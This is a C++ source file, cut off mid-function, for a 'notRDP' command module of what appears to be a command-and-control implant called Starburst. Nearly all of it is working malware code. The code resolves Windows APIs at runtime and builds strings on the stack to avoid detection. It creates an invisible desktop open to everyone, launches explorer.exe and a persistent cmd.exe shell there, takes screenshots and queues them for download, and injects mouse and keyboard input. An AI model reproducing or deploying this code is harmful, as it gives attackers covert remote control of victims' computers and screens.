/*
 * notRDP for Starburst — Invisible alternate Windows desktop with
 * screen capture and interactive mouse/keyboard input.
 *
 * Based on dagowda/notRDP (MIT License) — adapted for
 * Starburst's PIC C++ conventions (no CRT, symbol<> strings,
 * runtime API resolution via LoadLibraryA/GetProcAddress).
 *
 * Operations:
 *   start  — create hidden desktop, launch explorer.exe on it
 *   shot   — capture a BMP screenshot of the hidden desktop
 *   input  — inject mouse/keyboard input (PostMessage-based)
 *   stop   — teardown
 */

#include <commands.h>
#include <common.h>
#include <config.h>
#include <package.h>
#include <parser.h>
#include <stackstr.h>
#include <strings.h>

#ifdef INCLUDE_CMD_NOTRDP

using namespace stardust;
using namespace starburst;

#define NR_DESKTOP_NAME L"StarburstHidden"
#define NR_SEC_DESCRIPTOR 1
#define NR_DACL_INFO 4
#define NR_DESKTOP_ALL 0x000001FF
#define NR_DESKTOP_READOBJECTS 0x00000001
#define NR_DESKTOP_WRITEOBJECTS 0x00000080
#define NR_DESKTOP_SWITCHDESKTOP 0x00000100
#define NR_GENERIC_READ 0x20000
#define NR_WRITE_DAC 0x40000
#define NR_CREATE_NEW_CONSOLE 0x10
#define NR_SM_CXSCREEN 0
#define NR_SM_CYSCREEN 1
#define NR_SRCCOPY 0x00CC0020
#define NR_SWITCH_BLIP_MS 700

/* WM messages for PostMessage */
#define NR_WM_MOUSEMOVE 0x0200
#define NR_WM_LBUTTONDOWN 0x0201
#define NR_WM_LBUTTONUP 0x0202
#define NR_WM_RBUTTONDOWN 0x0204
#define NR_WM_RBUTTONUP 0x0205
#define NR_WM_KEYDOWN 0x0100
#define NR_WM_KEYUP 0x0101
#define NR_MK_LBUTTON 0x0001
#define NR_MK_RBUTTON 0x0002

/* Bitmap header sizes */
#define NR_BITMAPFILEHEADER_SIZE 14
#define NR_BITMAPINFOHEADER_SIZE 40

struct NotRdpState {
  HANDLE h_desktop;
  HANDLE h_orig_desktop;
  HANDLE h_explorer_proc;
  HANDLE h_shell_proc;
  uint32_t explorer_pid;
  uint32_t shell_pid;
  bool active;
};

/* Function typedefs — all resolved at runtime via GetProcAddress */
typedef void *(WINAPI *fn_CreateDesktopW)(const wchar_t *, const wchar_t *,
                                          void *, uint32_t, uint32_t, void *);
typedef void *(WINAPI *fn_OpenDesktopW)(const wchar_t *, uint32_t, int,
                                        uint32_t);
typedef int(WINAPI *fn_CloseDesktop)(void *);
typedef int(WINAPI *fn_SetThreadDesktop)(void *);
typedef void *(WINAPI *fn_GetThreadDesktop)(uint32_t);
typedef int(WINAPI *fn_SwitchDesktop)(void *);
typedef int(WINAPI *fn_InitializeSecurityDescriptor)(void *, uint32_t);
typedef int(WINAPI *fn_SetSecurityDescriptorDacl)(void *, int, void *, int);
typedef BOOL(WINAPI *fn_CreateProcessW)(const wchar_t *, wchar_t *, void *,
                                        void *, int, uint32_t, void *,
                                        const wchar_t *, void *, void *);
typedef int(WINAPI *fn_TerminateProcess)(void *, uint32_t);
typedef int(WINAPI *fn_MultiByteToWideChar)(uint32_t, uint32_t, const char *,
                                            int, wchar_t *, int);
typedef HDC(WINAPI *fn_GetDC)(void *);
typedef int(WINAPI *fn_ReleaseDC)(void *, HDC);
typedef int(WINAPI *fn_GetSystemMetrics)(int);
typedef HDC(WINAPI *fn_CreateCompatibleDC)(HDC);
typedef HGDIOBJ(WINAPI *fn_CreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ(WINAPI *fn_SelectObject)(HDC, HGDIOBJ);
typedef int(WINAPI *fn_BitBlt)(HDC, int, int, int, int, HDC, int, int,
                               uint32_t);
typedef int(WINAPI *fn_GetDIBits)(HDC, HGDIOBJ, uint32_t, uint32_t, void *,
                                  void *, uint32_t);
typedef int(WINAPI *fn_DeleteObject)(void *);
typedef int(WINAPI *fn_DeleteDC)(HDC);
typedef BOOL(WINAPI *fn_PostMessageW)(void *, uint32_t, uintptr_t, intptr_t);
typedef void *(WINAPI *fn_WindowFromPoint)(int32_t, int32_t);
typedef int(WINAPI *fn_ScreenToClient)(void *, void *);
typedef uint32_t(WINAPI *fn_GetWindowThreadProcessId)(void *, uint32_t *);

#pragma pack(push, 1)
struct NR_BITMAPINFOHEADER {
  uint32_t biSize;
  int32_t biWidth;
  int32_t biHeight;
  uint16_t biPlanes;
  uint16_t biBitCount;
  uint16_t biCompression;
  uint32_t biSizeImage;
  int32_t biXPelsPerMeter;
  int32_t biYPelsPerMeter;
  uint32_t biClrUsed;
  uint32_t biClrImportant;
};
#pragma pack(pop)

/* ── helper: to_wide ── */
static auto declfn nr_to_wide(instance &inst, const char *s, wchar_t *out,
                              int out_cap) -> void {
  inst.kernel32.MultiByteToWideChar(65001, 0, s, -1, out, out_cap);
}

/* ── launch explorer.exe on the hidden desktop ── */
static auto declfn nr_launch_explorer(instance &inst, NotRdpState *state,
                                      uint32_t *err_out) -> bool {
  auto pCreateProcessW =
      reinterpret_cast<fn_CreateProcessW>(inst.kernel32.GetProcAddress(
          reinterpret_cast<HMODULE>(inst.kernel32.handle),
          symbol<LPCSTR>("CreateProcessW")));

  if (!pCreateProcessW) {
    *err_out = 0xFFFFFFFF;
    return false;
  }

  /* Launch explorer.exe with STARTUPINFOW.lpDesktop =
   * "WinSta0\\StarburstHidden" — si.lpDesktop tells Windows to launch
   * on that desktop. No thread desktop switch needed. */
  wchar_t w_cmd[16] = {};
  wchar_t exp[] = {'e', 'x', 'p', 'l', 'o', 'r', 'e',
                   'r', '.', 'e', 'x', 'e', 0};
  memory::copy(w_cmd, exp, 26);

  wchar_t w_desktop_path[64];
  memory::zero(w_desktop_path, 128);
  /* Desktop name only (no WinSta0\ prefix): the child then launches on
   * that desktop within the CALLING process's window station, which is
   * where CreateDesktopW created it. */
  memory::copy(w_desktop_path, (void *)NR_DESKTOP_NAME, 32);

  /* Build STARTUPINFOW with lpDesktop pointing to hidden desktop.
   * Do NOT switch the calling thread's desktop — si.lpDesktop handles it.
   * STARTUPINFOW x64 layout: cb(0), lpReserved(8), lpDesktop(16) */
  uint8_t si_buf[104] = {};
  *(uint32_t *)(si_buf) = 104; /* cb */
  *(uint64_t *)(si_buf + 16) = (uint64_t)w_desktop_path;

  uint8_t pi_buf[24] = {};

  bool ok =
      pCreateProcessW(nullptr, w_cmd, nullptr, nullptr, 0,
                      NR_CREATE_NEW_CONSOLE, nullptr, nullptr, si_buf, pi_buf);

  if (ok) {
    state->h_explorer_proc = *(HANDLE *)(pi_buf);
    state->explorer_pid = *(uint32_t *)(pi_buf + 16);
  } else {
    *err_out = inst.kernel32.GetLastError();
  }

  /* explorer.exe self-exits when launched as SYSTEM on a secondary desktop.
   * Launch cmd.exe /k as a persistent shell so the desktop has a live
   * window to capture and interact with. */
  wchar_t w_cmd2[24] = {};
  wchar_t cmdstr[] = {'c', 'm', 'd', '.', 'e', 'x', 'e', ' ', '/', 'k', 0};
  memory::copy(w_cmd2, cmdstr, 22);
  uint8_t pi2[24] = {};
  if (pCreateProcessW(nullptr, w_cmd2, nullptr, nullptr, 0,
                      NR_CREATE_NEW_CONSOLE, nullptr, nullptr, si_buf, pi2)) {
    state->h_shell_proc = *(HANDLE *)(pi2);
    state->shell_pid = *(uint32_t *)(pi2 + 16);
  } else if (!ok) {
    *err_out = inst.kernel32.GetLastError();
  }

  return ok;
}

/* ── capture a BMP screenshot of the hidden desktop ── */
static auto declfn nr_capture(instance &inst, NotRdpState *state,
                              char *task_uuid) -> void {
  STK_USER32(_u32);
  STK_GDI32(_g32);

  auto h_user32 = inst.kernel32.LoadLibraryA(_u32);
  auto h_gdi32 = inst.kernel32.LoadLibraryA(_g32);
  if (!h_user32 || !h_gdi32) {
    queue_response(
        inst, task_uuid, RESPONSE_ERROR,
        symbol<char *>(const_cast<char *>("user32/gdi32 load failed")));
    return;
  }

  auto pOpenDesk = reinterpret_cast<fn_OpenDesktopW>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("OpenDesktopW")));
  auto pSetThreadDesk =
      reinterpret_cast<fn_SetThreadDesktop>(inst.kernel32.GetProcAddress(
          h_user32, symbol<LPCSTR>("SetThreadDesktop")));
  auto pGetThreadDesk =
      reinterpret_cast<fn_GetThreadDesktop>(inst.kernel32.GetProcAddress(
          h_user32, symbol<LPCSTR>("GetThreadDesktop")));
  auto pGetCurThreadId =
      reinterpret_cast<uint32_t(WINAPI *)(void)>(inst.kernel32.GetProcAddress(
          reinterpret_cast<HMODULE>(inst.kernel32.handle),
          symbol<LPCSTR>("GetCurrentThreadId")));
  auto pCloseDesk = reinterpret_cast<fn_CloseDesktop>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("CloseDesktop")));
  auto pGetDC = reinterpret_cast<fn_GetDC>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("GetDC")));
  auto pReleaseDC = reinterpret_cast<int(WINAPI *)(void *, HDC)>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("ReleaseDC")));
  auto pGetSysMetrics =
      reinterpret_cast<fn_GetSystemMetrics>(inst.kernel32.GetProcAddress(
          h_user32, symbol<LPCSTR>("GetSystemMetrics")));
  auto pCreateCompatDC =
      reinterpret_cast<fn_CreateCompatibleDC>(inst.kernel32.GetProcAddress(
          h_gdi32, symbol<LPCSTR>("CreateCompatibleDC")));
  auto pCreateCompatBitmap =
      reinterpret_cast<fn_CreateCompatibleBitmap>(inst.kernel32.GetProcAddress(
          h_gdi32, symbol<LPCSTR>("CreateCompatibleBitmap")));
  auto pSelectObject = reinterpret_cast<fn_SelectObject>(
      inst.kernel32.GetProcAddress(h_gdi32, symbol<LPCSTR>("SelectObject")));
  auto pBitBlt = reinterpret_cast<fn_BitBlt>(
      inst.kernel32.GetProcAddress(h_gdi32, symbol<LPCSTR>("BitBlt")));
  auto pGetDIBits = reinterpret_cast<fn_GetDIBits>(
      inst.kernel32.GetProcAddress(h_gdi32, symbol<LPCSTR>("GetDIBits")));
  auto pDeleteObject = reinterpret_cast<fn_DeleteObject>(
      inst.kernel32.GetProcAddress(h_gdi32, symbol<LPCSTR>("DeleteObject")));
  auto pDeleteDC = reinterpret_cast<fn_DeleteDC>(
      inst.kernel32.GetProcAddress(h_gdi32, symbol<LPCSTR>("DeleteDC")));

  if (!pOpenDesk || !pSetThreadDesk || !pGetThreadDesk || !pGetCurThreadId ||
      !pCloseDesk || !pGetDC || !pReleaseDC || !pGetSysMetrics ||
      !pCreateCompatDC || !pCreateCompatBitmap || !pSelectObject || !pBitBlt ||
      !pGetDIBits || !pDeleteObject || !pDeleteDC) {
    queue_response(inst, task_uuid, RESPONSE_ERROR,
                   symbol<char *>(const_cast<char *>("gdi resolve failed")));
    return;
  }

  /* Read screen metrics from the DEFAULT desktop BEFORE switching —
   * a freshly created hidden desktop has no monitor and returns 0. */
  int width = pGetSysMetrics(NR_SM_CXSCREEN);
  int height = pGetSysMetrics(NR_SM_CYSCREEN);
  if (width <= 0 || height <= 0) {
    width = 1920;
    height = 1080;
  }

  /* Switch to hidden desktop */
  wchar_t w_desk_name[32];
  memory::zero(w_desk_name, 64);
  nr_to_wide(inst, "StarburstHidden", w_desk_name, 32);

  void *h_orig = pGetThreadDesk(pGetCurThreadId());
  /* needs DESKTOP_SWITCHDESKTOP for the SwitchDesktop render blip below */
  void *h_desk = pOpenDesk(w_desk_name, 0, 0,
                           NR_DESKTOP_READOBJECTS | NR_DESKTOP_WRITEOBJECTS |
                               NR_DESKTOP_SWITCHDESKTOP);
  if (!h_desk) {
    queue_response(inst, task_uuid, RESPONSE_ERROR,
                   symbol<char *>(const_cast<char *>("open desktop failed")));
    return;
  }
  pSetThreadDesk(h_desk);

  /* DWM only renders the ACTIVE desktop — make the hidden desktop active
   * briefly so BitBlt sees content, then restore the user's desktop.
   * This causes a short visual blip on the console (~blip ms). */
  auto pSwitchDesk = reinterpret_cast<fn_SwitchDesktop>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("SwitchDesktop")));
  auto pSleep =
      reinterpret_cast<void(WINAPI *)(uint32_t)>(inst.kernel32.GetProcAddress(
          reinterpret_cast<HMODULE>(inst.kernel32.handle),
          symbol<LPCSTR>("Sleep")));
  int switched = 0;
  if (pSwitchDesk && pSwitchDesk(h_desk)) {
    switched = 1;
    if (pSleep)
      pSleep(NR_SWITCH_BLIP_MS);
  }

  HDC h_screen = pGetDC(nullptr);
  if (!h_screen) {
    if (switched)
      pSwitchDesk(h_orig);
    pSetThreadDesk(h_orig);
    pCloseDesk(h_desk);
    queue_response(inst, task_uuid, RESPONSE_ERROR,
                   symbol<char *>(const_cast<char *>("getdc failed")));
    return;
  }

  HDC h_mem = pCreateCompatDC(h_screen);
  if (!h_mem) {
    pReleaseDC(nullptr, h_screen);
    if (switched)
      pSwitchDesk(h_orig);
    pSetThreadDesk(h_orig);
    pCloseDesk(h_desk);
    queue_response(
        inst, task_uuid, RESPONSE_ERROR,
        symbol<char *>(const_cast<char *>("create compat dc failed")));
    return;
  }

  HGDIOBJ h_bitmap = pCreateCompatBitmap(h_screen, width, height);
  if (!h_bitmap) {
    pDeleteDC(h_mem);
    pReleaseDC(nullptr, h_screen);
    if (switched)
      pSwitchDesk(h_orig);
    pSetThreadDesk(h_orig);
    pCloseDesk(h_desk);
    queue_response(
        inst, task_uuid, RESPONSE_ERROR,
        symbol<char *>(const_cast<char *>("create compat bitmap failed")));
    return;
  }

  HGDIOBJ h_old = pSelectObject(h_mem, h_bitmap);
  pBitBlt(h_mem, 0, 0, width, height, h_screen, 0, 0, NR_SRCCOPY);

  NR_BITMAPINFOHEADER bmi = {};
  bmi.biSize = NR_BITMAPINFOHEADER_SIZE;
  bmi.biWidth = width;
  bmi.biHeight = height;
  bmi.biPlanes = 1;
  bmi.biBitCount = 24;
  bmi.biCompression = 0;

  pGetDIBits(h_mem, h_bitmap, 0, 0, nullptr, &bmi, 0);

  uint32_t row_size = ((width * 3 + 3) & ~3);
  uint32_t data_size = row_size * height;
  uint32_t bmp_size =
      NR_BITMAPFILEHEADER_SIZE + NR_BITMAPINFOHEADER_SIZE + data_size;

  auto bmp_buf = static_cast<uint8_t *>(inst.heap_alloc(bmp_size));
  if (!bmp_buf) {
    queue_response(inst, task_uuid, RESPONSE_ERROR,
                   symbol<char *>(const_cast<char *>("bmp alloc failed")));
    goto cleanup_gdi;
  }

  memory::zero(bmp_buf, bmp_size);

  /* BITMAPFILEHEADER (14 bytes) */
  bmp_buf[0] = 0x42;
  bmp_buf[1] = 0x4D;
  *(uint32_t *)(bmp_buf + 2) = bmp_size;
  *(uint32_t *)(bmp_buf + 10) =
      NR_BITMAPFILEHEADER_SIZE + NR_BITMAPINFOHEADER_SIZE;

  /* BITMAPINFOHEADER */
  memory::copy(bmp_buf + NR_BITMAPFILEHEADER_SIZE, &bmi,
               NR_BITMAPINFOHEADER_SIZE);

  /* Pixel data */
  pGetDIBits(h_mem, h_bitmap, 0, height,
             bmp_buf + NR_BITMAPFILEHEADER_SIZE + NR_BITMAPINFOHEADER_SIZE,
             &bmi, 0);

  /* Queue as chunked file download */
  {
    /* Must match CHUNK_SIZE used by cmd_download_resp when sending chunks */
    uint32_t total_chunks = (bmp_size + CHUNK_SIZE - 1) / CHUNK_SIZE;

    int slot = -1;
    for (uint32_t s = 0; s < inst.MAX_PENDING_DOWNLOADS; s++) {
      if (!inst.downloads.entries[s].active) {
        slot = static_cast<int>(s);
        break;
      }
    }

    if (slot < 0) {
      inst.heap_free(bmp_buf);
      queue_response(
          inst, task_uuid, RESPONSE_ERROR,
          symbol<char *>(const_cast<char *>("too many pending downloads")));
      goto cleanup_gdi;
    }

    /* Store pending download state (in-memory buffer).
     * bmp_buf ownership transfers to cmd_download_resp — do NOT free here. */
    {
      auto &dl = inst.downloads.entries[slot];
      memory::copy(dl.task_uuid, task_uuid, 36);
      dl.task_uuid[36] = '\0';
      dl.h_file = INVALID_HANDLE_VALUE;
      dl.mem_buf = bmp_buf;
      dl.total_size = bmp_size;
      dl.total_chunks = total_chunks;
      dl.is_mem = true;
      dl.active = true;
    }

    auto pkg = package_create(inst);
    package_add_byte(inst, pkg, ACTION_POST_RESPONSE);
    package_add_string(inst, pkg, task_uuid);
    package_add_byte(inst, pkg, RESPONSE_PROCESSING);
    package_add_byte(inst, pkg, DOWNLOAD_INIT);
    package_add_int32(inst, pkg, total_chunks);
    package_add_int32(inst, pkg, bmp_size);
    package_add_string(inst, pkg,
                       symbol<char *>(const_cast<char *>("notrdp_frame.bmp")));

    uint32_t data_len = 0;
    auto data = package_build(pkg, &data_len);

    uint32_t needed = inst.response_queue.length + 4 + data_len;
    if (needed > inst.response_queue.capacity) {
      uint32_t new_cap = inst.response_queue.capacity == 0
                             ? 1024
                             : inst.response_queue.capacity;
      while (new_cap < needed)
        new_cap *= 2;
      inst.response_queue.buffer = static_cast<uint8_t *>(
          inst.heap_realloc(inst.response_queue.buffer, new_cap));
      inst.response_queue.capacity = new_cap;
    }

    auto qbuf = inst.response_queue.buffer + inst.response_queue.length;
    qbuf[0] = (data_len >> 24) & 0xFF;
    qbuf[1] = (data_len >> 16) & 0xFF;
    qbuf[2] = (data_len >> 8) & 0xFF;
    qbuf[3] = data_len & 0xFF;
    memory::copy(qbuf + 4, data, data_len);
    inst.response_queue.length += 4 + data_len;
    package_destroy(inst, pkg);
  }

cleanup_gdi:
  /* bmp_buf ownership is with the pending download (cmd_download_resp frees
   * it after the last chunk). Only GDI objects are released here. */
  pSelectObject(h_mem, h_old);
  pDeleteObject(h_bitmap);
  pDeleteDC(h_mem);
  pReleaseDC(nullptr, h_screen);
  if (switched)
    pSwitchDesk(h_orig);
  pSetThreadDesk(h_orig);
  pCloseDesk(h_desk);
}

/* ── inject mouse/keyboard input via PostMessage ── */
static auto declfn nr_input(instance &inst, NotRdpState *state, int32_t x,
                            int32_t y, int32_t action, int32_t key) -> void {
  STK_USER32(_u32);
  auto h_user32 = inst.kernel32.LoadLibraryA(_u32);
  if (!h_user32)
    return;

  auto pOpenDesk = reinterpret_cast<fn_OpenDesktopW>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("OpenDesktopW")));
  auto pSetThreadDesk =
      reinterpret_cast<fn_SetThreadDesktop>(inst.kernel32.GetProcAddress(
          h_user32, symbol<LPCSTR>("SetThreadDesktop")));
  auto pGetThreadDesk =
      reinterpret_cast<fn_GetThreadDesktop>(inst.kernel32.GetProcAddress(
          h_user32, symbol<LPCSTR>("GetThreadDesktop")));
  auto pGetCurThreadId =
      reinterpret_cast<uint32_t(WINAPI *)(void)>(inst.kernel32.GetProcAddress(
          reinterpret_cast<HMODULE>(inst.kernel32.handle),
          symbol<LPCSTR>("GetCurrentThreadId")));
  auto pCloseDesk = reinterpret_cast<fn_CloseDesktop>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("CloseDesktop")));
  auto pPostMessage = reinterpret_cast<fn_PostMessageW>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("PostMessageW")));
  auto pWindowFromPoint =
      reinterpret_cast<fn_WindowFromPoint>(inst.kernel32.GetProcAddress(
          h_user32, symbol<LPCSTR>("WindowFromPoint")));
  auto pScreenToClient = reinterpret_cast<fn_ScreenToClient>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("ScreenToClient")));

  if (!pOpenDesk || !pSetThreadDesk || !pGetThreadDesk || !pGetCurThreadId ||
      !pCloseDesk || !pPostMessage || !pWindowFromPoint || !pScreenToClient)
    return;

  wchar_t w_desk_name[32];
  memory::zero(w_desk_name, 64);
  nr_to_wide(inst, "StarburstHidden", w_desk_name, 32);

  void *h_orig = pGetThreadDesk(pGetCurThreadId());
  void *h_desk = pOpenDesk(w_desk_name, 0, 0, NR_GENERIC_READ);
  if (!h_desk)
    return;
  pSetThreadDesk(h_desk);

  /* Find window at coordinates */
  /* POINT = { LONG x; LONG y; } = 8 bytes on x64 */
  uint8_t pt_buf[8];
  *(int32_t *)(pt_buf) = x;
  *(int32_t *)(pt_buf + 4) = y;
  void *h_target = pWindowFromPoint(x, y);

  if (h_target) {
    uint8_t client_buf[8];
    *(int32_t *)(client_buf) = x;
    *(int32_t *)(client_buf + 4) = y;
    pScreenToClient(h_target, client_buf);

    int32_t cx = *(int32_t *)(client_buf);
    int32_t cy = *(int32_t *)(client_buf + 4);
    intptr_t lParam = (intptr_t)((cy << 16) | (cx & 0xFFFF));
    uintptr_t wParam = 0;

    switch (action) {
    case 0:
      pPostMessage(h_target, NR_WM_MOUSEMOVE, 0, lParam);
      break;
    case 1:
      pPostMessage(h_target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON, lParam);
      pPostMessage(h_target, NR_WM_LBUTTONUP, 0, lParam);
      break;
    case 2:
      pPostMessage(h_target, NR_WM_RBUTTONDOWN, NR_MK_RBUTTON, lParam);
      pPostMessage(h_target, NR_WM_RBUTTONUP, 0, lParam);
      break;
    case 3:
      pPostMessage(h_target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON, lParam);
      pPostMessage(h_target, NR_WM_LBUTTONUP, 0, lParam);
      pPostMessage(h_target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON | 0x0004, lParam);
      pPostMessage(h_target, NR_WM_LBUTTONUP, 0x0004, lParam);
      break;
    case 4:
      pPostMessage(h_target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON, lParam);
      break;
    case 5:
      pPostMessage(h_target, NR_WM_LBUTTONUP, 0, lParam);
      break;
    case 6:
      pPostMessage(h_target, NR_WM_RBUTTONDOWN, NR_MK_RBUTTON, lParam);
      break;
    case 7:
      pPostMessage(h_target, NR_WM_RBUTTONUP, 0, lParam);
      break;
    case 10:
      if (key > 0) {
        pPostMessage(h_target, NR_WM_KEYDOWN, (uintptr_t)key, 0);
        pPostMessage(h_target, NR_WM_KEYUP, (uintptr_t)key, 0);
      }
      break;
    case 11:
      if (key > 0)
        pPostMessage(h_target, NR_WM_KEYDOWN, (uintptr_t)key, 0);
      break;
    case 12:
      if (key > 0)
        pPostMessage(h_target, NR_WM_KEYUP, (uintptr_t)key, 0);
      break;
    }
  }

  pSetThreadDesk(h_orig);
  pCloseDesk(h_desk);
}

/* ── teardown ── */
static auto declfn nr_stop(instance &inst, NotRdpState *state) -> void {
  if (state->h_shell_proc) {
    auto pTerm =
        reinterpret_cast<fn_TerminateProcess>(inst.kernel32.GetProcAddress(
            reinterpret_cast<HMODULE>(inst.kernel32.handle),
            symbol<LPCSTR>("TerminateProcess")));
    if (pTerm)
      pTerm(state->h_shell_proc, 0);
    inst.kernel32.CloseHandle(state->h_shell_proc);
    state->h_shell_proc = nullptr;
  }
  if (state->h_explorer_proc) {
    auto pTerminate =
        reinterpret_cast<fn_TerminateProcess>(inst.kernel32.GetProcAddress(
            reinterpret_cast<HMODULE>(inst.kernel32.handle),
            symbol<LPCSTR>("TerminateProcess")));
    if (pTerminate)
      pTerminate(state->h_explorer_proc, 0);
    inst.kernel32.CloseHandle(state->h_explorer_proc);
    state->h_explorer_proc = nullptr;
  }

  if (state->h_desktop) {
    STK_USER32(_u32s);
    auto h_user32s = inst.kernel32.LoadLibraryA(_u32s);
    auto pCloseDesk = reinterpret_cast<fn_CloseDesktop>(
        h_user32s ? inst.kernel32.GetProcAddress(h_user32s,
                                                 symbol<LPCSTR>("CloseDesktop"))
                  : nullptr);
    if (pCloseDesk)
      pCloseDesk(state->h_desktop);
    state->h_desktop = nullptr;
  }

  state->active = false;
  inst.heap_free(state);
  inst.notrdp_state_ptr = nullptr;
}

/* ── main command handler ── */
auto declfn starburst::cmd_notrdp(_Inout_ instance &inst, _In_ char *task_uuid,
                                  _In_ Parser *params) -> void {
  uint32_t action_len = 0;
  auto action = parser_string(params, &action_len);

  if (!action || action_len == 0) {
    queue_response(inst, task_uuid, RESPONSE_ERROR,
                   symbol<char *>(const_cast<char *>("missing action")));
    return;
  }

  /* ── START ── */
  char start_s[] = {'s', 't', 'a', 'r', 't', 0};
  if (str_ncmp(action, start_s, 5) == 0) {
    auto cur = static_cast<NotRdpState *>(inst.notrdp_state_ptr);
    if (cur) {
      queue_response(
          inst, task_uuid, RESPONSE_ERROR,
          symbol<char *>(const_cast<char *>("notRDP already running")));
      return;
    }

    auto state =
        static_cast<NotRdpState *>(inst.heap_alloc(sizeof(NotRdpState)));
    if (!state) {
      queue_response(inst, task_uuid, RESPONSE_ERROR,
                     symbol<char *>(const_cast<char *>("heap alloc failed")));
      return;
    }
    memory::zero(state, sizeof(NotRdpState));

    STK_USER32(_u32);
    auto h_user32 = inst.kernel32.LoadLibraryA(_u32);
    if (!h_user32) {
      inst.heap_free(state);
      queue_response(inst, task_uuid, RESPONSE_ERROR,
                     symbol<char *>(const_cast<char *>("user32 load failed")));
      return;
    }

    auto pCreateDesktop =
        reinterpret_cast<fn_CreateDesktopW>(inst.kernel32.GetProcAddress(
            h_user32, symbol<LPCSTR>("CreateDesktopW")));
    if (!pCreateDesktop) {
      inst.heap_free(state);
      queue_response(
          inst, task_uuid, RESPONSE_ERROR,
          symbol<char *>(const_cast<char *>("CreateDesktopW not found")));
      return;
    }

    /* Create the hidden desktop. dwFlags must be 0 for CreateDesktopW.
     * Explicit SECURITY_ATTRIBUTES with a NULL DACL — everyone full access,
     * same as the original notRDP, so child processes on the desktop and
     * later agent instances can always open it.
     * SECURITY_DESCRIPTOR is 40 bytes on x64; SECURITY_ATTRIBUTES 24. */
    STK_ADVAPI32(_adv);
    auto h_adv = inst.kernel32.LoadLibraryA(_adv);
    uint8_t sa_buf[24] = {};
    uint8_t *sd_ptr = nullptr;
    if (h_adv) {
      auto pInitSD = reinterpret_cast<fn_InitializeSecurityDescriptor>(
          inst.kernel32.GetProcAddress(
              h_adv, symbol<LPCSTR>("InitializeSecurityDescriptor")));
      auto pSetDacl = reinterpret_cast<fn_SetSecurityDescriptorDacl>(
          inst.kernel32.GetProcAddress(
              h_adv, symbol<LPCSTR>("SetSecurityDescriptorDacl")));
      if (pInitSD && pSetDacl) {
        auto sd_buf = static_cast<uint8_t *>(inst.heap_alloc(64));
        if (sd_buf) {
          memory::zero(sd_buf, 64);
          pInitSD(sd_buf, NR_SEC_DESCRIPTOR);
          /* DACL = NULL -> grant everyone full access */
          pSetDacl(sd_buf, 1, nullptr, 0);
          *(uint32_t *)(sa_buf) = 24;
          *(uint64_t *)(sa_buf + 8) = (uint64_t)sd_buf;
          *(uint8_t *)(sa_buf + 16) = 0;
          sd_ptr = sd_buf;
        }
      }
    }

    state->h_desktop =
        pCreateDesktop(NR_DESKTOP_NAME, nullptr, nullptr, 0, NR_DESKTOP_ALL,
                       sd_ptr ? sa_buf : nullptr);
    if (sd_ptr)
      inst.heap_free(sd_ptr);

    if (!state->h_desktop) {
      uint32_t cd_err = inst.kernel32.GetLastError();
      auto pOpenDesk =
          reinterpret_cast<fn_OpenDesktopW>(inst.kernel32.GetProcAddress(
              h_user32, symbol<LPCSTR>("OpenDesktopW")));
      if (pOpenDesk) {
        wchar_t w_dn[32];
        memory::zero(w_dn, 64);
        nr_to_wide(inst, "StarburstHidden", w_dn, 32);
        state->h_desktop = pOpenDesk(w_dn, 0, 0, NR_DESKTOP_ALL);
        if (!state->h_desktop)
          state->h_desktop =
              pOpenDesk(w_dn, 0, 0,
                        NR_DESKTOP_READOBJECTS | NR_DESKTOP_WRITEOBJECTS |
                            NR_DESKTOP_SWITCHDESKTOP | NR_WRITE_DAC);
      }
      if (!state->h_desktop) {
        inst.heap_free(state);
        char errbuf[48] = {};
        const char msg_s[] = {'C', 'r', 'e', 'a', 't', 'e', 'D', 'e',
                              's', 'k', 't', 'o', 'p', 'W', ' ', 'f',
                              'a', 'i', 'l', 'e', 'd', ' ', 0};
        memory::copy(errbuf, (void *)msg_s, 23);
        char digits[12] = {};
        uint32_t v = cd_err;
        int di = 0;
        if (v == 0)
          digits[di++] = '0';
        while (v > 0) {
          digits[di++] = static_cast<char>('0' + (v % 10));
          v /= 10;
        }
        int bi = 22;
        for (int k = di - 1; k >= 0; k--)
          errbuf[bi++] = digits[k];
        errbuf[bi] = 0;
        queue_response(inst, task_uuid, RESPONSE_ERROR,
                       symbol<char *>(const_cast<char *>(errbuf)));
        return;
      }
    }

    /* Launch explorer.exe on the hidden desktop */
    uint32_t launch_err = 0;
    if (!nr_launch_explorer(inst, state, &launch_err)) {
      auto pCloseDesk =
          reinterpret_cast<fn_CloseDesktop>(inst.kernel32.GetProcAddress(
              h_user32, symbol<LPCSTR>("CloseDesktop")));
      if (pCloseDesk)
        pCloseDesk(state->h_desktop);
      inst.heap_free(state);
      /* format "explorer launch failed <code>" */
      char errbuf[48] = {};
      const char msg_s[] = {'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r',
                            ' ', 'l', 'a', 'u', 'n', 'c', 'h', ' ',
                            'f', 'a', 'i', 'l', 'e', 'd', ' ', 0};
      memory::copy(errbuf, (void *)msg_s, 24);
      char digits[12] = {};
      uint32_t v = launch_err;
      int di = 0;
      if (v == 0) {
        digits[di++] = '0';
      }
      while (v > 0) {
        digits[di++] = static_cast<char>('0' + (v % 10));
        v /= 10;
      }
      int bi = 23;
      for (int k = di - 1; k >= 0 && bi < 46; k--)
        errbuf[bi++] = digits[k];
      errbuf[bi] = 0;
      queue_response(inst, task_uuid, RESPONSE_ERROR,
                     symbol<char *>(const_cast<char *>(errbuf)));
      return;
    }

    state->active = true;
    inst.notrdp_state_ptr = state;

    {
      char okbuf[96] = {};
      const char ok_s[] = {'h', 'i', 'd', 'd', 'e', 'n', ' ', 'd',
                           'e', 's', 'k', 't', 'o', 'p', ' ', 'e',
                           'x', 'p', 'i', 'd', '=', 0};
      memory::copy(okbuf, (void *)ok_s, 22);
      char digits[12] = {};
